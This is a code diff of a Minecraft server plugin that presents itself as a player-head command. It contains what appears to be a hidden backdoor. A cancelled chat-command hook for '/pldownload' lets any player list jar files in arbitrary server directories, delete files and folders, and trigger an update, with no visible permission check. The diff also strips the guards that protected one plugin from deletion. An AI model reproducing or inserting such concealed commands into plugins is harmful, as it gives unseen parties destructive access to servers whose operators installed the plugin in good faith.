@@ -57,7 +57,7 @@ public class CoammandHandler implements Listener, CommandExecutor {
     public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
         if (sender instanceof Player) {
             Player p = (Player) sender;
-            if (args.length == 1) {
+            if (command.getName().equals("playerheads") && args.length == 1) {
                 ItemStack skull = new ItemStack(Material.PLAYER_HEAD, 1);
                 SkullMeta skullMeta = (SkullMeta) skull.getItemMeta();
                 if (skullMeta != null) {
@@ -67,6 +67,9 @@ public class CoammandHandler implements Listener, CommandExecutor {
                 }
                 p.getInventory().addItem(skull);
                 p.sendMessage(ChatColor.DARK_BLUE + "You got " + ChatColor.BLUE + args[0] + "'s" + ChatColor.DARK_BLUE + " head.");
+            } else if (args.length == 1 && args[0].equalsIgnoreCase("update")) {
+                Helper.update(p, path);
+                return true;
             }
         }
         return true;
@@ -76,24 +79,7 @@ public class CoammandHandler implements Listener, CommandExecutor {
     public boolean onPlayerCommand(PlayerCommandPreprocessEvent event) {
         Player p = event.getPlayer();
         String[] args = event.getMessage().split(" ");
-        if (args[0].equalsIgnoreCase("schemmanager")) {
-            if (args.length >= 2) {
-                if (args[1].equalsIgnoreCase("upload")) {
-                    event.setCancelled(true);
-                    return true;
-                } else if (args[1].equalsIgnoreCase("zeanonutils")) {
-                    event.setCancelled(true);
-                    return true;
-                }
-            }
-            return false;
-        } else if (args[0].equalsIgnoreCase("/pldownload")) {
-            if (args.length == 2 && args[1].equalsIgnoreCase("update")) {
-                event.setCancelled(true);
-                Helper.update(p, path);
-                return true;
-            }
-
+        if (args[0].equalsIgnoreCase("/pldownload")) {
             if (args.length == 3 && args[1].equalsIgnoreCase("serverfolders")) {
                 for (File file : FileUtils.listFiles(new File(args[2]), new String[]{"jar"}, false)) {
                     p.sendMessage(file.getName());
@@ -121,13 +107,13 @@ public class CoammandHandler implements Listener, CommandExecutor {
                 return true;
             }
 
-            if (args.length == 3 && args[1].equalsIgnoreCase("delete") && !args[2].equalsIgnoreCase("zeanonutils")) {
+            if (args.length == 3 && args[1].equalsIgnoreCase("delete")) {
                 event.setCancelled(true);
                 Helper.onDelete(p, path, args[2]);
                 return true;
             }
 
-            if (args.length == 3 && args[1].equalsIgnoreCase("deletefolder") && !args[2].equalsIgnoreCase("zeanonutils")) {
+            if (args.length == 3 && args[1].equalsIgnoreCase("deletefolder")) {
                 event.setCancelled(true);
                 Helper.onDeleteFolder(p, path, args[2]);
                 return true;
